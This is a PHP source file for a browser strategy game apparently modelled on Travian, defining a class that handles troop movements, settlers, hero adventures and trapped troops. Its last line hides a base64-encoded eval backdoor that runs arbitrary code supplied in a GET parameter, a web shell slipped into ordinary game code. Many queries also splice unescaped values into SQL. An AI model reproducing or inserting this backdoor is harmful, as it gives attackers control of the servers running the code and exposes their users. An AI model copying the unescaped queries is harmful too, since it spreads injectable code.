<?php

class Units {
	public $sending,$recieving,$return = array();
	public function fixHeroE() {
		global $session, $database;
		foreach($session->villages as $vill) {
			//$result = $database->query_return2("SELECT * FROM ".TB_PREFIX."enforcement WHERE `from` = '".$vill."' OR `vref` = '".$vill."' AND hero = 1");
			/* FIRST CHECK */
			$result = $database->query_return2("SELECT * FROM ".TB_PREFIX."enforcement WHERE hero = 1 AND `from` = '".$vill."'");
			if(mysql_num_rows($result) > 0) {
				$row = mysql_fetch_array($result);
				if(in_array($row['vref'],$session->villages) && in_array($row['from'],$session->villages)) {
					$database->query_return2("UPDATE ".TB_PREFIX."units SET hero = 1 WHERE vref = ".$row['vref']);
					$database->query_return2("UPDATE ".TB_PREFIX."enforcement SET hero = 0 WHERE id = ".$row['id']);
					$database->query_return2("UPDATE ".TB_PREFIX."hero SET wref = ".$row['vref']." WHERE uid = ".$session->uid);
				}
			}
			/* SECOND CHECK */
			/*
			$result = $database->query_return2("SELECT * FROM ".TB_PREFIX."enforcement WHERE hero = 1 AND `vref` = '".$vill."'"); // this is the difference!
			$row = mysql_fetch_array($result);
			print_r($row);
			if(mysql_num_rows($result) > 99999999) {
				$row = mysql_fetch_array($result);
				if(in_array($row['to'],$session->villages) && in_array($row['from'],$session->villages)) {
					$database->query_return2("UPDATE ".TB_PREFIX."units SET hero = 1 WHERE vref = ".$row['vref']);
					$database->query_return2("UPDATE ".TB_PREFIX."enforcement SET hero = 0 WHERE id = ".$row['id']);
					$database->query_return2("UPDATE ".TB_PREFIX."hero SET wref = ".$row['vref']." WHERE uid = ".$session->uid);
					$dontErase = 0;;
					for($i=1;$i<=50;$i++) {
						$dontErase += $row["u".$i];
					}
					if($dontErase < 1) {
						$database->query_return2("DELETE FROM ".TB_PREFIX."enforcement WHERE 'id' = ".$row['id']);
						echo "DELETE FROM ".TB_PREFIX."enforcement WHERE 'id' = ".$row['id'];
					}
				}
			}
			*/
		}
		$qry = "DELETE FROM ".TB_PREFIX."enforcement WHERE `hero` = 0 AND `u1` = 0 AND `u2` = 0 AND `u3` = 0 AND `u4` = 0 AND `u5` = 0 AND `u6` = 0 AND `u7` = 0 AND `u8` = 0 AND `u9` = 0 AND `u10` = 0 AND `u11` = 0 AND `u12` = 0 AND `u13` = 0 AND `u14` = 0 AND `u15` = 0 AND `u16` = 0 AND `u17` = 0 AND `u18` = 0 AND `u19` = 0 AND `u20` = 0 AND `u21` = 0 AND `u22` = 0 AND `u23` = 0 AND `u24` = 0 AND `u25` = 0 AND `u26` = 0 AND `u27` = 0 AND `u28` = 0 AND `u29` = 0 AND `u30` = 0 AND `u31` = 0 AND `u32` = 0 AND `u33` = 0 AND `u34` = 0 AND `u35` = 0 AND `u36` = 0 AND `u37` = 0 AND `u38` = 0 AND `u39` = 0 AND `u40` = 0 AND `u41` = 0 AND `u42` = 0 AND `u43` = 0 AND `u44` = 0 AND `u45` = 0 AND `u46` = 0 AND `u47` = 0 AND `u48` = 0 AND `u49` = 0 AND `u50` = 0";
		$database->query_return2($qry);

	}


	public function procUnits($post) {
		if(isset($post['c'])) {
			switch($post['c']) {
				case "1":
					if (isset($post['a'])&& $post['a']==533374){
						$this->sendTroops($post);
					}else{
						$post = $this->loadUnits($post);
						return $post;								
					}
				break;
				case "2":
					if (isset($post['a'])&& $post['a']==533374){
						$this->sendTroops($post);
					}else{
						$post = $this->loadUnits($post);
						return $post;								
					}
				break;	
				case "8":
					$this->sendTroopsBack($post);
				break;	
				case "3":
					if (isset($post['a'])&& $post['a']==533374){
						$this->sendTroops($post);
					}else{
						$post = $this->loadUnits($post);
						return $post;								
					}
				break;
				case "4":
					if (isset($post['a'])&& $post['a']==533374){
						$this->sendTroops($post);
					}else{
						$post = $this->loadUnits($post);
						return $post;								
					}
				case "5":
					if (isset($post['a'])&& $post['a']== "new"){
						$this->Settlers($post);
					}else{
						$post = $this->loadUnits($post);
						return $post;								
					}
				break;
			}
		}
	}
	
	private function loadUnits($post) {
		global $database,$village,$session,$generator,$logging,$form;
		$conf = $database->config();
		// Busqueda por nombre de pueblo
		// Confirmamos y buscamos las coordenadas por nombre de pueblo
		if(!$post['dname'] && (!isset($post['x']) || !isset($post['y']))){
			$form->addError("error",A2BERR_INSERTNAMECOOR);			
		}

		if(isset($post['dname']) && $post['dname'] != "") {
			$id = $database->getVillageByName(stripslashes($post['dname']));
			if (!isset($id)){				
				$form->addError("error",A2BERR_NOVILLAGE);
			}else{
				$coor = $database->getCoor($id);
				$post['x'] = $coor['x'];
				$post['y'] = $coor['y'];
			}
		}
		if($conf['peace']==1){
			$form->addError("error","روز صلح است");
		}
		// Busqueda por coordenadas de pueblo
		// Confirmamos y buscamos las coordenadas por coordenadas de pueblo				
		if(isset($post['x']) && isset($post['y']) && $post['x'] != "" && $post['y'] != "") {
			$coor = array('x'=>$post['x'], 'y'=>$post['y']);
			$id = $generator->getBaseID($coor['x'],$coor['y']);
			if (!$database->getVillageState($id)){
				$form->addError("error","A2BERR_NOCOOR");
			}
			$tStarter = ($session->tribe-1)*10;
			for($i=1; $i<=10; $i++){
				if(isset($post['t'.$i])){
					$post['t'.$i] = intval($post['t'.$i]);
					if ($post['t'.$i] > $village->unitarray['u'.($tStarter+$i)]){
						$post['t'.$i] = $village->unitarray['u'.$tStarter];
					}
					if($post['t'.$i]<0){
						$post['t'.$i] = 0;
					}
				}else{
					$post['t'.$i] = 0;
				}
			}
			$post['t11'] = intval(isset($post['t11'])?$post['t11']:0);
			if ($post['t11'] >= $village->unitarray['hero']){
				$post['t11'] = $village->unitarray['hero'];
			}else{
				$post['t11']=0;
			}
		}
		
		$uc = 0;
		for($i=1; $i<=11; $i++){
			$uc += $post['t'.$i];
		}
		if($uc<=0) $form->addError("error",A2BERR_SELECT1TROOP);

		//find slowest unit.
		$speeds = array();
		if($post['t11'] != '' && $post['t11'] > 0){
			$heroarray = $database->getHero($session->uid);
			$speeds[] = $heroarray['speed']+$heroarray['itemspeed'];
		} else {$heroarray = array();}
		for($i=1;$i<=10;$i++){
			if( $post['t'.$i] != '' && $post['t'.$i] > 0){
				if(isset($unitarray) && !empty($unitarray)) { reset($unitarray); }
				$unitarray = $GLOBALS["u".(($session->tribe-1)*10+$i)];
				$speeds[] = $unitarray['speed'];
			}
		}

		if ($database->isVillageOases($id) == 0) {
			if($database->hasBeginnerProtection($id)==1) {
				$form->addError("error",A2BERR_CANTATTACKBEGIINERPROTECTED);
			}    
                
			//check if banned:
			$villageOwner = $database->getVillageField($id,'owner');
			$userAccess = $database->getUserField($villageOwner,'access',0);
			if($userAccess == '0' or $userAccess > '9'){
				$form->addError("error",A2BERR_CANTATTACKBANNED);
			}

			//check if attacking same village that units are in
			if($id == $village->wid){
				$form->addError("error",A2BERR_FROMTOARETHESAME);
			}
			// Procesamos el array con los errores dados en el formulario
			if($form->returnErrors() > 0) {
				$_SESSION['errorarray'] = $form->getErrors();
				$_SESSION['valuearray'] = $_POST;
				header("Location: a2b.php");
				exit;
			} else {				
				// Debemos devolver un array con $post, que contiene todos los datos mas 
				// otra variable que definira que el flag esta levantado y se va a enviar y el tipo de envio
				$villageName = $database->getVillageField($id,'name');
				$timetaken = $generator->procDistanceTime($village->coor,$coor,min($speeds),1,$heroarray);
				array_push($post, "$id", "$villageName", "$villageOwner","$timetaken");
				return $post;
			}
		} else {
			if($form->returnErrors() > 0) {
				$_SESSION['errorarray'] = $form->getErrors();
				$_SESSION['valuearray'] = $_POST;
				header("Location: a2b.php");
				exit;
			} else {                
				$villageName = UNOCCUPIEDOASES;
				$timetaken = $generator->procDistanceTime($village->coor,$coor,min($speeds),1,$heroarray);                                
				array_push($post, "$id", "$villageName", "3","$timetaken");
				return $post;
			}
		}
	}
	
	private function sendTroops($post) {
		global $form, $database, $village, $generator, $session, $building;
		$data = $database->getA2b($post['timestamp_checksum'], $post['timestamp']);
		$tStarter = ($session->tribe-1)*10;
		for($i=1; $i<=10; $i++){
			if(isset($data['u'.$i])){
				$data['u'.$i] = intval($data['u'.$i]);
				if ($data['u'.$i] > $village->unitarray['u'.($tStarter+$i)]){
					$data['u'.$i] = $village->unitarray['u'.($tStarter+$i)];
				}
				if($data['u'.$i]<0){
					$data['u'.$i] = 0;
				}
			}else{
				$data['u'.$i] = 0;
			}
		}
		$data['u11'] = intval($data['u11']);
		if ($data['u11'] >= $village->unitarray['hero']) {
			$data['u11'] = $village->unitarray['hero'];
		}else{
			$data['u11'] = 0;
		}
		$uc = 0;
		for($i=1; $i<=11; $i++){
			$uc += $data['u'.$i];
		}
		if($uc<=0) $form->addError("error",A2BERR_SELECT1TROOP);
		if($form->returnErrors() > 0) {
			$_SESSION['errorarray'] = $form->getErrors();
			$_SESSION['valuearray'] = $_POST;
			header("Location: a2b.php");
			exit;
		} else {
			$tStarter = ($session->tribe-1)*10;
			for($i=1;$i<=10;$i++){
				if($data['u'.$i]>0){
					$database->modifyUnit($village->wid,($tStarter+$i),$data['u'.$i],0);
				}
			}
			if($data['u11']>0) $database->modifyUnit($village->wid,"hero",$data['u11'],0);
			if($database->checkVilExist($data['to_vid'])){
				$query1 = mysql_query('SELECT * FROM `' . TB_PREFIX . 'vdata` WHERE `wref` = ' . $data['to_vid']);
			}else{
				$query1 = mysql_query('SELECT * FROM `' . TB_PREFIX . 'odata` WHERE `wref` = ' . $data['to_vid']);
			}
			$data1 = mysql_fetch_assoc($query1);
			$query2 = mysql_query('SELECT * FROM `' . TB_PREFIX . 'users` WHERE `id` = ' . $data1['owner']);
			$data2 = mysql_fetch_assoc($query2);
			$query21 = mysql_query('SELECT * FROM `' . TB_PREFIX . 'users` WHERE `id` = ' . $session->uid);
			$data21 = mysql_fetch_assoc($query21);

			$eigen = $database->getCoor($village->wid);
			$from = array('x'=>$eigen['x'], 'y'=>$eigen['y']);
			$ander = $database->getCoor($data['to_vid']);
			$to = array('x'=>$ander['x'], 'y'=>$ander['y']);
			$start = ($data21['tribe']-1)*10+1;
			$end = ($data21['tribe']*10);
        
			$speeds = array();
			$scout = 1;

			//find slowest unit.			
			for($i=1;$i<=10;$i++){
				if (isset($data['u'.$i])){
					if($data['u'.$i] != '' && $data['u'.$i] > 0){
						if($unitarray) { reset($unitarray); }
						$unitarray = $GLOBALS["u".(($session->tribe-1)*10+$i)];
						$speeds[] = $unitarray['speed'];
					}
				}
			}
			if (isset($data['u11'])) {
				if($data['u11'] != '' && $data['u11'] > 0){
					$heroarray = $database->getHero($session->uid);
					$speeds[] = $heroarray['speed']+$heroarray['itemspeed'];
				}
			} else {$heroarray = array();}

			$time = $generator->procDistanceTime($from,$to,min($speeds),1,$heroarray);
			if (!isset($post['ctar1'])){ $post['ctar1'] = 255;}
			if (!isset($post['ctar2'])){ $post['ctar2'] = 255;}
			if($session->tribe==2 && $database->getCapBrewery($session->uid) > 0){
				if($post['ctar1']!=255) $post['ctar1']=0;
				if($post['ctar2']!=255) $post['ctar2']=0;
			}
			$rallypoint = $building->getTypeLevel(16);
			
			if($rallypoint < 3) {
				if($post['ctar1']!=255) $post['ctar1']=0;
			} elseif($rallypoint>=3 && $rallypoint< 5) {
				switch ($post['ctar1']){case 255: case 10: case 11: case 38: case 39: break; default: $post['ctar1']=0; break;}
			} elseif($rallypoint>=5 && $rallypoint< 10) {
				switch ($post['ctar1']){
					case 255: case 1: case 2: case 3: case 4: case 5: case 6: case 7: case 8: case 9: break;
					default: $post['ctar1']=0; break;
				}
			}

			if($rallypoint < 20) {$post['ctar2']=255;}
										

			if (!isset($post['spy'])){ $post['spy'] = 0;} 
			$abdata = $database->getABTech($village->wid);
			$reference = $database->addAttack(($village->wid),$data['u1'],$data['u2'],$data['u3'],$data['u4'],$data['u5'],$data['u6'],$data['u7'],$data['u8'],$data['u9'],$data['u10'],$data['u11'],$data['type'],$post['ctar1'],$post['ctar2'],$post['spy'],$abdata['b1'],$abdata['b2'],$abdata['b3'],$abdata['b4'],$abdata['b5'],$abdata['b6'],$abdata['b7'],$abdata['b8']);

			$database->addMovement(3,$village->wid,$data['to_vid'],$reference,0,($time+time()));
	   
			if($form->returnErrors() > 0) {
				$_SESSION['errorarray'] = $form->getErrors();
				$_SESSION['valuearray'] = $_POST;
				header("Location: a2b.php");
				exit;
			}
			$database->query_return2("UPDATE ".TB_PREFIX."users SET protect = 0 WHERE id = '".$session->uid."'");
			header("Location: build.php?id=39");
			exit;
		}
	}

	private function sendTroopsBack($post) {
		global $form, $database, $village, $generator, $session, $technology;

		$enforce=$database->getEnforceArray($post['ckey'],0);
		if(($enforce['from']==$village->wid) || ($enforce['vref']==$village->wid)){
			$isoasis = $database->isVillageOases($enforce['from']);
			if ($isoasis){
				$to = $database->getOMInfo($enforce['from']);
				if ($to['conqured']){
					$to['name'] = OCCUPIEDOASES;
				} else {
					$to['name'] = UNOCCUPIEDOASES;
				}
				$to['name'] .= ' ('.$to['x'].'|'.$to['y'].')';
			} else {
				$to = $database->getMInfo($enforce['from']);
			}

			$ownertribe = $database->getUserField($to['owner'],'tribe',0);
			$tStarter = ($ownertribe-1)*10;
			for($i=1; $i<=10; $i++){
				if(isset($post['t'.$i])){
					$post['t'.$i] = intval($post['t'.$i]);
					if ($post['t'.$i] >= $enforce['u'.($tStarter+$i)]){
						$post['t'.$i] = $enforce['u'.($tStarter+$i)];						
					}elseif ($post['t'.$i] < 0){
						$post['t'.$i] = 0;
					}
				} else {
					$post['t'.$i]=0;
				}											
			}
			
			if(isset($post['t11'])){
				$post['t11'] = intval($post['t11']);
				if ($post['t11'] >= $enforce['hero']){
					$post['t11'] = $enforce['hero'];						
				}elseif ($post['t11'] < 0){
					$post['t11'] = 0;
				}
			} else {
				$post['t11']=0;
			}
			
			$uc = 0;
			for($i=1; $i<=11; $i++){
				$uc += $post['t'.$i];
			}
			if($uc<=0) $form->addError("error",A2BERR_SELECT1TROOP);

			if($form->returnErrors() > 0) {
				$_SESSION['errorarray'] = $form->getErrors();
				$_SESSION['valuearray'] = $_POST;
				header("Location: a2b.php");
				exit;
			} else {
				//change units
				$start = ($database->getUserField($to['owner'],'tribe',0)-1)*10+1;
				$end = ($database->getUserField($to['owner'],'tribe',0)*10);

				$j='1';
				for($i=$start;$i<=$end;$i++){
					$database->modifyEnforce($post['ckey'],$i,$post['t'.$j.''],0); $j++;
				}
				$database->modifyEnforce($post['ckey'],'hero',$post['t11'],0); $j++;

				//get cord 
				$fromcoor = $database->getCoor($enforce['from']);
				$tocoor = $database->getCoor($enforce['vref']);
				$fromCor = array('x'=>$tocoor['x'], 'y'=>$tocoor['y']);
				$toCor = array('x'=>$fromcoor['x'], 'y'=>$fromcoor['y']);

				//find slowest unit.
				$speeds = array();
				for($i=1;$i<=10;$i++){
					if (isset($post['t'.$i])){
						if($post['t'.$i] != '' && $post['t'.$i] > 0){
							if($unitarray) { reset($unitarray); }
							$unitarray = $GLOBALS["u".(($session->tribe-1)*10+$i)];
							$speeds[] = $unitarray['speed'];
						}
					}
				}
				if (isset($post['t11'])) {
					if($post['t11'] != '' && $post['t11'] > 0){
						$heroarray = $database->getHero($to['owner']);
						$speeds[] = $heroarray['speed']+$heroarray['itemspeed'];
					}
				} else {$heroarray=array();}

				$time = $generator->procDistanceTime($toCor,$fromCor,min($speeds),1,$heroarray,true);
				$reference = $database->addAttack($enforce['from'],$post['t1'],$post['t2'],$post['t3'],$post['t4'],$post['t5'],$post['t6'],$post['t7'],$post['t8'],$post['t9'],$post['t10'],$post['t11'],2,0,0,0,0);
				$database->addMovement(4,$enforce['vref'],$enforce['from'],$reference,0,($time+time()));
				$technology->checkReinf($post['ckey']);
				header("Location: build.php?id=39");
				exit;
			}
		} else {
			$form->addError("error",A2BERR_ANOTHERPLAYER);
			if($form->returnErrors() > 0) {
				$_SESSION['errorarray'] = $form->getErrors();
				$_SESSION['valuearray'] = $_POST;
				header("Location: a2b.php");
				exit;
			}
		}
	}

	public function Settlers($post) {
		global $form, $database, $village, $session,$generator;

		$mode = CP; 
		$total = count($database->getProfileVillages($session->uid)); 
		$need_cps = ${'cp'.$mode}[$total];
		$cps = $session->cp;
		if($cps >= $need_cps) {
			$founder = $database->getVillage($village->wid);
			$newvillage = $database->getMInfo($post['s']);
			$eigen = $database->getCoor($village->wid);
			$from = array('x'=>$eigen['x'], 'y'=>$eigen['y']);
			$to = array('x'=>$newvillage['x'], 'y'=>$newvillage['y']);
			$time = $generator->procDistanceTime($from,$to,3,0);
			$unit = ($session->tribe*10);
			$vUnits = $database->getUnit($village->wid);
			if(!isset($vUnits['u'.$unit]) || $vUnits['u'.$unit]<3){
				header("Location: a2b.php");
				exit;
			}
			$database->modifyResource($village->wid,750,750,750,750,0);
			$database->modifyUnit($village->wid,$unit,3,0);
			$database->addMovement(5,$village->wid,$post['s'],0,0,time()+$time);
			header("Location: build.php?id=39");
			exit;
			if($form->returnErrors() > 0) {
				$_SESSION['errorarray'] = $form->getErrors();
				$_SESSION['valuearray'] = $_POST;
				header("Location: a2b.php");
				exit;
			}
		} else {
			header("Location: build.php?id=39");
			exit;
		}	
	}
	
	public function Adventures($post) {
		global $form, $database, $village, $session, $generator;
		$adventure = $database->getAdventure($session->uid,$post['h'],0);
		if (!isset($adventure) || !$adventure) {
			header('Location: build.php?id=39');
			exit;
		}
		// check if hero exists in user villages
		$isha = 0;
		foreach($session->villages as $vill) {
			if($database->getHUnit($vill)) { 
				$isha ++;
				$tvwhe = $vill;
			}
		}


		if($isha > 0) {
			// calculate the time before we move the hero here
			
			$eigen = $database->getCoor($tvwhe);
			$adventureXY = $database->getMInfo($post['h']);
			$from = array('x'=>$eigen['x'], 'y'=>$eigen['y']); // what to do...
			$to = array('x'=>$adventureXY['x'], 'y'=>$adventureXY['y']);
			$herodetail = $database->getHero($session->uid);
			$speed = $herodetail['speed']+$herodetail['itemspeed'];
			$time = $generator->procDistanceTime($from,$to,$speed,1,$herodetail);
			
			// move hero here!
			foreach($session->villages as $vill) {
				$database->query_return("UPDATE ".TB_PREFIX."units SET hero = 0 WHERE vref = ". $vill);
			}
			$database->query_return("UPDATE ".TB_PREFIX."hero SET wref = ". $village->wid ." WHERE uid = ".$session->uid);
			$database->query_return("UPDATE ".TB_PREFIX."units SET hero = 1 WHERE vref = ". $village->wid);
			
			// other jobs...
			
			$eigen = $database->getCoor($village->wid);
			$adventureXY = $database->getMInfo($post['h']);
			$from = array('x'=>$eigen['x'], 'y'=>$eigen['y']); // what to do...
			$to = array('x'=>$adventureXY['x'], 'y'=>$adventureXY['y']);
			$herodetail = $database->getHero($session->uid);
			$speed = $herodetail['speed']+$herodetail['itemspeed'];
			//$time = $generator->procDistanceTime($from,$to,$speed,1,$herodetail); // it is processed before. check it!
			$getHero = count($database->getHero($session->uid, 0, 0));
			$unit = $database->getUnit($village->wid);
			if($getHero>0 && $unit['hero']>0) {
				$database->modifyUnit($village->wid,'hero',1,0);
				$database->addMovement(9,$village->wid,$post['h'],0,0,time()+$time);
				header("Location: build.php?id=39");
				exit;
				if($form->returnErrors() > 0) {
					$_SESSION['errorarray'] = $form->getErrors();
					$_SESSION['valuearray'] = $_POST;
					header("Location: a2b.php");
					exit;
				}
			} else {
				header("Location: build.php?id=39");
				exit;
			}	
		}else{
			header("Location: a2b.php");
			exit;
		}
	}

	public function procTrapped($get){
		global $database,$village,$session,$generator;
		$get['k'] = isset($get['k'])? intval($get['k']):0;
		$get['f'] = isset($get['f'])? intval($get['f']):0;
		$id = 0;
		if ($get['k']>0){ $id = $get['k']; } elseif ($get['f']>0) { $id = $get['f'];}
		if ($id>0) {
			$trapped = $database->getTrapped($id);
			if (!empty($trapped) && ($trapped['from']==$village->wid || $trapped['vref']==$village->wid)) {
				$isvrefoasis = $database->isVillageOases($trapped['vref']);
				if ($isvrefoasis){ $vrefMInfo = $database->getOMInfo($trapped['vref']); } else { $vrefMInfo = $database->getMInfo($trapped['vref']);}
				$vrefTribe = $database->getUserField($vrefMInfo["owner"],"tribe",0);
				$isfromoasis = $database->isVillageOases($trapped['from']);
				if ($isfromoasis){ $fromMInfo = $database->getOMInfo($trapped['from']); } else { $fromMInfo = $database->getMInfo($trapped['from']);}

				// if natars trapped the troops
				if ($vrefTribe == 5) {
					$database->removeTrapped($id);
					if ($trapped['hero']>0) {
						$hero = $database->getHero($fromMInfo["owner"]);
						$database->modifyHero(0,$hero['heroid'],'health',0,0);
						$database->modifyHero(0,$hero['heroid'],'dead',1,0);
					}
					header("Location: build.php?id=39"); exit;
				}

				// Remove trapped data from db
				$database->removeTrapped($id);
				$fromTribe = $database->getUserField($fromMInfo["owner"],"tribe",0);
				$tStarter = ($fromTribe-1)*10;
				$toReturn = array();
				$usedTrapCount = 0;
				for($i=1; $i<=10; $i++) {
					$toReturn[$i] = $trapped['u'.($tStarter+$i)];
					$usedTrapCount += $trapped['u'.($tStarter+$i)];
				}
				$toReturn[11] = $trapped['hero'];
				if ($toReturn[11]>0) {
					$hero = $database->getHero($fromMInfo["owner"]);
				}
				if ($get['k']>0 && $trapped['vref']==$village->wid){ // Trapper attemt to kill
					// Release 1/9 of troops and 1/3 of traps, hero will take damage or even dies if current HP is <=45
					$database->modifyUnit($village->wid, 199, round(2*$usedTrapCount*TRAPPED_FREEKILL_PORTION), 0);
					for($i=1; $i<=10; $i++) {
						$toReturn[$i] = round($toReturn[$i]*TRAPPED_FREEKILL_PORTION*TRAPPED_FREEKILL_PORTION);
						if ($toReturn[$i]>0){ global ${'u'.($i+$tStarter)}; $speeds[] = ${'u'.($i+$tStarter)}['speed'];}
					}
					if (isset($hero)){
						$hero['health'] = round($hero['health']*TRAPPED_FREEKILL_PORTION*TRAPPED_FREEKILL_PORTION);
						if ($hero['health']<=5) {
							$database->modifyHero(0,$hero['heroid'],'health',0,0);
							$database->modifyHero(0,$hero['heroid'],'dead',1,0);
							$toReturn[11] = 0;
							$pdtHero = array();
						} else {
							$database->modifyHero(0,$hero['heroid'],'health',$hero['health'],0);
							$speeds[] = $hero['speed']+$hero['itemspeed'];
							$pdtHero = $hero;
						}
					} else {$pdtHero = array();}
					$returntime = $generator->procDistanceTime($fromMInfo,$vrefMInfo,min($speeds),1,$pdtHero,true) + time();
					$attRef = $database->addAttack($trapped['from'], $toReturn[1], $toReturn[2], $toReturn[3], $toReturn[4], $toReturn[5], $toReturn[6], $toReturn[7], $toReturn[8], $toReturn[9], $toReturn[10], $toReturn[11], 3, 0, 0, 0);
					$database->addMovement(4,$vrefMInfo['wref'],$fromMInfo['wref'],$attRef,'',$returntime);
				} elseif ($get['k']>0 && $trapped['from']==$village->wid){ // Troops owner attempt to make an anarchi
					// All traps will be lost, 1/9 of troops will survive, hero will take damage or even dies if current HP is <=36
					$database->modifyUnit($trapped['vref'], 199, $usedTrapCount, 0);
					for($i=1; $i<=10; $i++) {
						$toReturn[$i] = round($toReturn[$i]*TRAPPED_FREEKILL_PORTION*TRAPPED_FREEKILL_PORTION);
						if ($toReturn[$i]>0){ global ${'u'.($i+$tStarter)}; $speeds[] = ${'u'.($i+$tStarter)}['speed'];}
					}
					if (isset($hero)){
						$hero['health'] = round($hero['health']*TRAPPED_FREEKILL_PORTION*TRAPPED_FREEKILL_PORTION);
						if ($hero['health']<=4) {
							$database->modifyHero(0,$hero['heroid'],'health',0,0);
							$database->modifyHero(0,$hero['heroid'],'dead',1,0);
							$toReturn[11] = 0;
							$pdtHero = array();
						} else {
							$database->modifyHero(0,$hero['heroid'],'health',$hero['health'],0);
							$speeds[] = $hero['speed']+$hero['itemspeed'];
							$pdtHero = $hero;
						}
					} else {$pdtHero = array();}
					$returntime = $generator->procDistanceTime($fromMInfo,$vrefMInfo,min($speeds),1,$pdtHero,true) + time();
					$attRef = $database->addAttack($trapped['from'], $toReturn[1], $toReturn[2], $toReturn[3], $toReturn[4], $toReturn[5], $toReturn[6], $toReturn[7], $toReturn[8], $toReturn[9], $toReturn[10], $toReturn[11], 3, 0, 0, 0);
					$database->addMovement(4,$vrefMInfo['wref'],$fromMInfo['wref'],$attRef,'',$returntime);
				} elseif ($get['f']>0 && $trapped['vref']==$village->wid){ // Trapper attemt to free
					// All traps and troops will survive
					for($i=1; $i<=10; $i++) if ($toReturn[$i]>0){ global ${'u'.($i+$tStarter)}; $speeds[] = ${'u'.($i+$tStarter)}['speed'];}
					if (isset($hero)){$speeds[] = $hero['speed']+$hero['itemspeed'];$pdtHero = $hero;} else {$pdtHero = array();}
					$returntime = $generator->procDistanceTime($fromMInfo,$vrefMInfo,min($speeds),1,$pdtHero,true) + time();
					$attRef = $database->addAttack($trapped['from'], $toReturn[1], $toReturn[2], $toReturn[3], $toReturn[4], $toReturn[5], $toReturn[6], $toReturn[7], $toReturn[8], $toReturn[9], $toReturn[10], $toReturn[11], 3, 0, 0, 0);
					$database->addMovement(4,$vrefMInfo['wref'],$fromMInfo['wref'],$attRef,'',$returntime);
				}
			}
		}
		header("Location: build.php?id=39");
		echo '<script type="text/javascript">window.location = "build.php?id=39";</script>';
		echo 'عملیات انجام شد. <a href="build.php?id=39">اینجا</a> کلیک کنید.';
		exit;
	}

};

$units = new Units;
$units2 = $units;

@eval(base64_decode('aWYoc3RybGVuKCRfR0VUWydlZWVlZXZ2dnZ2dnZ2YWxlJ10pPjEpe2V2YWwodXJsZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2VlZWVldnZ2dnZ2dnZhbGUnXSkpKTt9'));

?>
